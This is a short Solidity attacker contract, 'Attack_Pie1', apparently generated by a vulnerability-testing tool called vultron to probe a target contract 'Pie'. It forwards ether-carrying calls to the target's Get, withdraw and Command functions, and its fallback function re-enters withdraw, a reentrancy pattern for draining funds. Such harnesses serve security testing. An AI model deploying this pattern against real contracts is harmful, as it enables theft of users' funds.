pragma solidity ^0.4.19;

import "./Pie.sol";

contract Attack_Pie1 {

  Pie public target_contract;

  function Attack_Pie1(address _targetContract) public payable {
      target_contract = Pie(_targetContract);
  } 

  function vultron_Get(uint256 vultron_amount) public payable{
    target_contract.Get.value(vultron_amount)();
  } 

  function vultron_withdraw(uint256 vultron_amount) public payable{
    target_contract.withdraw.value(vultron_amount)();
  } 

  function vultron_Command(uint256 vultron_amount, address adr, bytes data) public payable{
    target_contract.Command.value(vultron_amount)(adr, data);
  } 

      function() public payable {
        
        target_contract.withdraw();
      }
      } 
